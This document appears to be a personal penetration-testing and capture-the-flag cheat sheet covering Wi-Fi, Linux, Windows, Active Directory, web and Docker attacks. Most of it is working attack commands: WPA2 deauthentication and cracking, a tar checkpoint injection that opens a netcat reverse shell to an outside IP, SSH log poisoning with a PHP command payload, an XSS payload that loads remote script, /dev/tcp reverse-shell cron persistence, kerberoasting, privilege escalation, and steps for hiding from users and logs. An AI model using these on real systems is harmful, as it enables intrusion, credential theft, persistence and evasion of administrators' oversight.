# Wireless

To start with WPA2 Cracking make sure that your network interface is in monitor <br/>

````
ifconfig wlan0 down
iwfconfig wlan0 mode managed
ifconfig wlan0 up
````
Then run airmon-ng <br/>
```
airmon-ng check kill
airmon-ng start wlan0
```
To sniff different AP (Access Points)<br/>

`airodump-ng wlan0`

To start capturing traffic for a specific AP we use channel number `-c` and MAC address `--bssid` <br/>

`airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS wlan0 `<br/>

Now in order to capture the 4-way handshake we need to start the above command with a parameter `-w` so that the caputre file can be saved<br/>

 `airodump-ng -c CHANNEL_NUMBER --bssid MAC_ADDRESS -w FILENAME wlan0`<br/>

Keep this running and launch the deauthentication attack on the AP with a specific host , you can do this to death all clients/host on the AP <br/>

`aireplay-ng -0 0 -a MAC_ADDRESS -c HOST_NAME wlan0`<br/>

When a client connects back to the host this will capture the handshake.To crack the password we need to use aircrack-ng <br/>

`aircrack-ng FILENAME.cap -w path/towordlist/`

When the passwords get cracked you can then go back to using `managed mode on your` network interface<br/>

`sudo systemctl restart NetworkManager.service` 

# Linux

### Stablilize Shell
1. ctrl+z
2. stty raw -echo
3. fg (press enter x2)
4. export TERM=xterm , for using `clear` command

### Spawn bash
* /usr/bin/script -qc /bin/bash 1&>/dev/null
* python -c 'import pty;pty.spawn("/bin/bash")'
* python3 -c 'import pty;pty.spawn("/bin/bash")'

### Vulnerable sudo (ALL,!root)
`sudo -u#-1 whoami`<br />
`sudo -u#-1 <path_of_executable_as_other_user>`

### Execute as diffent user
`sudo -u <user> <command>`

### FTP
Connect to ftp on the machine<br/>
`ftp user <ip>`
After successfully logged in you can download all files with
`mget *`
Download files recusively<br/>
` wget -r ftp://user:pass@<ip>/  `


### SMB Shares

#### SmbClient
* `smbclient -L \\\\<ip\\`     listing all shares
* `smbclient \\\\<ip>\\<share>` accessing a share anonymously
* `smbclient \\\\10.10.209.122\\<share> -U <share> `accessing a share with an authorized user

#### Smbmap
* `smbmap -u <username> -p <password> -H <ip>`

#### Smbget

* `smbget -R smb://<ip>/<share>` 

### NFS shares
* `showmount -e <ip> ` This lists the nfs shares
* `mount -t nfs <ip>:/<share_name> <directory_where_to_mount>` Mounting that share

### Cronjobs

* cronjobs for specific users are stored in `/var/spool/cron/cronjobs/`
* `crontab -u <user> -e ` Check cronjobs for a specific user
* `crontab -l`         cronjob for the current user
* `cat /etc/crontab`  system wide cronjobs

### Finding Binaries

* find . - perm /4000 (user id uid) 
* find . -perm /2000 (group id guid)

### Finding File capabilites

`getcap -r / 2>/dev/null`

### Finding text in a files
`grep -rnw '/path/to/somewhere/' -e 'pattern'
`
### Changing file attributes

chattr + i filename `making file immutable`<br/>
chattr -i filename `making file mutable`<br/>
lschattr filename `Checking file attributes`

### Uploading Files

scp file/you/want `user@ip`:/path/to/store <br/>
python -m SimpleHTTPServer [port] `By default will listen on 8000`<br/>
python3 -m http.server [port] `By default will listen on 8000`<br/>

### Downloading Files

`wget http://<ip>:port/<file>`

### Netcat to download files from target

`nc -l -p [port] > file` Receive file <br/>
`nc -w 3 [ip] [port] < file `Send file <br/>

### Cracaking Zip Archive

`fcrackzip -u -D -p <path_to_wordlist> <archive.zip>`

### Decrypting PGP key
If you have `asc` key which can be used for PGP authentication then 
* john key.asc > asc_hash
* john asc_hash --wordlists=path_to_wordlist

#### Having pgp cli
* pgp --import key.asc
* pgp --decrypt file.pgp

#### Having gpg cli
* gpg --import key.asc
* gpg --decrypt file.pgp

### killing a running job in same shell
`jobs`

```
Find it's job number

$ jobs
[1]+  Running                 sleep 100 &

$ kill %1
[1]+  Terminated              sleep 100

```
### SSH Port Forwarding
`ssh -L <port_that_is_blockd_>:localhost:<map_blocked_port> <username>@<ip>`

### SSH auth log poisoning

Login as any user to see that it gets logged then try to login with a malicious php code

### Port Forwarding using chisel

On attacker machine `/chisel_1.7.6_linux_amd64 server -p <port to listen>  --reverse`
On target machine `./chisel client <attacker>:<attacker_listening_port> R:localhost:<port to forward from target>`

### Poisining ssh auth log

`ssh '<?php system($_GET['a']); ?>'@192.168.43.2` 

Then `http://ip/page?a=whoami;`

### Getting root with ln (symlink)

If we have permissions to run /usr/bin/ln as root we can onw the machine
```
echo 'bash' > root
chmod +x root 
sudo /usr/bin/ln -sf /tmp/root /usr/bin/ln
sudo /usr/bin/ln

```

### Tar Exploitation

When ever you see a cronjob running with a command `cd /<user>/andre/backup tar -zcf /<folder>/filetar.gz *` go to that folder from which a backup is being created and running these command in that directory <br/ >
```
echo "mkfifo /tmp/lhennp; nc 10.2.54.209 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

### Binary Exploits

If there is a certain command running in a binary example `date` so we can create our own binary and add `/bin/bash` to and path so it gets executed<br/>
`export PATH=<path_where_binary_is>/:$PATH`


### VNC

If there's a port 5901 or 5900 open it's likely that it's for VNC , if you see `.remote_secret` or `.secret` it's the password for connecting for vnc

`vncviewer -passwd remote_secret <ip>::<port>`

#### Decrpyting vnc password

We can also decrypt the password for vnc using  `https://github.com/jeroennijhof/vncpwd`

`./vncpwd remote_secret  `

### Enumration 

* cat /etc/*release 
* cat /etc/issue 
* uname -a
* lsb_release -a
* Running Linpeas
* ss -tulpn (for ports that are open on the machine)
* netstat -tulpn
* ps -ef --forest

# Windows

### Adding User
net user "USER_NAME" "PASS" /add
### Changing User's password
net user "USER_NAME" "NEWPASS"
### Adding User to Administrators
net localgroup administrators "USER_NAME" /add
### Changing File Permissions
CACLS files /e /p {USERNAME}:{PERMISSION}<br/>
Permissions:<br/>
1.R `Read`<br/>
2.W `Write`<br/>
3.C `Change`<br/>
4.F `Full Control`

### Set File bits
attrib +r filename `add read only bit`<br/>
attrib -r filename `remove read only bit`<br/>
attrib +h filename `add hidden bit `<br/>
attrib -h filename `remove hidden bit`

### Show hidden file/folder
dir /a `show all hidden files & folder`<br/>
dir /a:d `show only hidden folder`<br/>
dir /a:h `show only hidden files`<br/>

### Downloading Files
`certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe`<br />
`powershell -c "wget http://<ip>:<port>/<file>" -outfile output.exe`<br />
`powershell Invoke-WebRequest -Uri $ip -OutFile $filepath`

## List Drives
`wmic logicaldisk get caption`

## Decrypting PSCredential Object
* $file = Import-Clixml -Path <path_to_file>
* $file.GetNetworkCredential().username
* $file.GetNetworkCredential().password

### Evil-winrm
`evil-winrm -i 10.10.213.169 -u <USER> -p '<PASS>'`

### Psexec.py
` python psexec.py DOMAIN/USER:PASS@IP`

### Privlege Escalation using SeImpersonatePrivilege

If this is enabled we can upload `Printspoofer.exe ` and place it if we have rights  

`PrintSpoofer.exe -i -c powershell.exe`

### Becoming NT\AUTHORITY (If user is in local administrators group)

If the system has `PsExec.exe` open elevated cmd 

`.\PsExec.exe -i -s cmd.exe`

### Active Directory
`powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
`. .\PowerView.ps1`      import the PowerView module

##### Using Bloodhound

* Upload `Sharphound.ps1` (https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)
* Then `. .\Sharhound.ps1`
* `Invoke-Bloodhound -CollectionMethod All -Domain DOMAIN-NAME -ZipFileName loot.zip` Domain name can be found by running `Get-ADDomain` and look for result
<img src="https://imgur.com/NxWapei.png"/>
* This command will give an archive which you will have to simply drag and drop on the bloodhound GUI running on your local machine and then quries for kerberoastable accounts or getting more information

##### Using Rubeus

* Download rubeus `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe`
* Documentation `https://github.com/GhostPack/Rubeus`
* Transfer rubeus.exe on targeted windows machine and run `.\Rubeus.exe kerberoast /outfile:C:\temp\hash.txt` to get a hash

# Msfvenom
### List All Payloads
msfvenom -l payloads
### List Payload Format
msfvenom --list formats

# Meterpreter
### Adding user for RDP
run getgui -u [USER_NAME] -p [PASS]

# Git

### Dumping repository
`./gitdumper.sh <location_of_remote_or_local_repostiory_having./.git> <destination_folder>`

### Extracting information from repository
`./extractor.sh <location_folder_having_.git_init> <extract_to_a_folder>`

# Web

### Make sure to check for backup files

If you came across a php file , look for a `.bak` as well i.e `config.php.bak`

### 403 By pass

https://github.com/intrudir/403fuzzer <br />

`python3 403fuzzer.py -hc 403 -u http://<ip>/page_that_you_want_to_bypass(which is usally a 403 foribben)`

### XSS to RCE
```
Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
Victim: <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
```

### SQL Map
`sqlmap -r request.txt --dbms=mysql --dump`

### Wfuzz

`wfuzz -c -z file,wordlist.txt --hh=0  http://<ip>/<path>/?date=FUZZ`

### API (Applicaton Programmable Interface)

* Check for possibility if there is a v1 , it is likely to be vulnerable to LFI 
* Use wfuzz which is tool to fuzz for API end points or for parameter
`wfuzz -u http://<ip>:<port>/<api-endpoint>\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404` <br/>
Here `api-endpoint` can be for example `/api/v1/resources/books\?FUZZ\=.bash_history` "?" is before the parameter and FUZZ is telling to find a parameter and we are looking for `.bash_hitory` as an example

### Web Shell Bash
`bash -c "<bash_rev_shell>"`


### Wordpress
using wpscan we can find users or do some further enumeration of wordpress version
* `wpscan --url http://<ip>/wordpress -e u` Enumerate Users
* `wpscan --url http://<ip>/wordpress -e ap` Enumearte All plugins

To bruteforce passwords
* `wpscan --url <ip> -U user_file_path -P password_file_path`

After logging into the wordpress dashboard , we can edit theme's 404.php page with a php revershell
`http://<ip>/wordpress/wp-content/themes/twentytwenty/404.php`

To get a RCE

* Goto `Appearance` -> `Editor` Select the 404.php template of the current theme and paste php reverse-shell.
* Then navigate to `http://ip/wp-content/themes/twentyfifteen/404.php` (theme name can be twentytwenty for the latest one) 

# Wordlists

### Directory Bruteforcing
* /usr/share/wordlists/dirb/big.txt
* /usr/share/wordlists/dirb/common.txt
* /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Gobuster
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist>`
* `gobuster dir -u http://<ip>/ -w <path_to_wordlist> -s "204,301,302,307,401,403"` (use status code if 200 is configured to respond on the web server to every get request)

### Feroxbuster
`feroxbuster -u http://<ip>/ -w <path_to_wordlist>`

### Dirsearch
`python3 dirsearch.py -u http://<ip>/ -w <path_to_text>`

### Credential Bruteforcing
* /usr/share/wordlists/rockyou.txt
* /usr/share/wordlists/fasstrackt.txt
* using `crackstation`
* using `seclists`

# Generating Worlists for directory brute force

### Cewl 
This spiders the given url and finding keyowrds then makes a wordlists through it's findings<br/>
`cewl.rb <ip>`

### Cruch

If we want to generate a password list having length of 7 starting with "milo" and having 3 digit number at the end we can use % for numbers , @ for lowercase letters, , for uppercase letters and ^ for special characters

` crunch 7 7 0123456789 -t milo%%% -o password.txt`

# DNS

### Finding Subdomains
`wfuzz -c -w <path_to_wordlist> -u 'http://domain.com -H 'Host: FUZZ.domain.com`

### Zone Transfer

If there is a port 53 open on the machine you could do a zone transfer to get information about DNS records

`dig axfr @<ip> <domain_name>

# King Of The Hill (KoTH)
### Monitoring and Closing Shell (Linux)
* strace `debugging / tamper with processes`
* gbd `c/c++ debugger`
* script - records terminal activites
* w /who `check current pts ,terminal device`
* ps -t ps/pts-number `process monitoring`
* script /dev/pts/pts-number `montior terminal`
* cat /dev/urandom > /dev/pts/pts-number  2>/dev/null `prints arbitary text on terminal`
* pkill -9 -t pts/pts-number
* Add this in root's crontab (crontab -e) <br />
```
*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
Or you can add in system wide contab (nano /etc/crontab)

```
*/1 * * * *     root    /bin/bash -c '/bin/bash -i >& /dev/tcp/127.0.0.1/2222 0>&1'
```
### Change SSH port
`nano /etc/ssh/sshd_config` (change PORT 22 to any port you want also you can tinker with configuration file)
`service sshd restart`     (Restart SSH service to apply changes)
### Hide yourself from "w" or "who"
`ssh user@ip -T` This -T will have some limiations , that you cannot run bash and some other commands but is helpful.

### Run Bash script on king.txt
`while [ 1 ]; do /root/chattr -i king.txt; done &`

### Send messages to logged in users
* echo "msg" > /dev/pts/pts-number `send message to specific user`<br />
* wall msg `boradcast message to everyone`<br />
  
### Closing Session (Windows)
* quser
* logoff id|user_name  


# Covering Track
11.11. Covering our Tracks

The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

    "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)
<img src="https://imgur.com/37aTxnI.png/>
          
    "/var/log/syslog" (System events such as firewall alerts:)
<img src="https://imgur.com/k7scyUP.png/>    
    "/var/log/<service/"
    For example, the access logs of apache2
        /var/log/apache2/access.log
<img src="https://imgur.com/y8Rin3h.png/>
          
# Docker
To see list of conatiner/images on a remote machine <br/>
`docker -H <ip>:2375 images`
To see list of currently running images/conatiner on a remote machine <br/>
`docker -H <ip>:2375 ps -a  `<br/>
To start a container from a remote machine <br/>
`docker -H <ip>:2375 exec -it <container-id> /bin/sh`<br/>
To start a container from a remote machine using name and tags<br/>
`docker -H <ip>:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh`<br/>
# Miscellaneous

## Turning off xfce beeping sound
`xset b off`

export HISTFILE=/dev/null found this it might help you out a little when doing KOTH it basically stops bash logging your commands in the ~/.bash_history file <br/>
sudo ifconfig tun0 down<br/>
sudo ip link set tun0 down<br/>
sudo ip link delete tun0<br/>
sudo systemctl restart systemd-networkd ; sudo systemctl status systemd-networkd<br/>
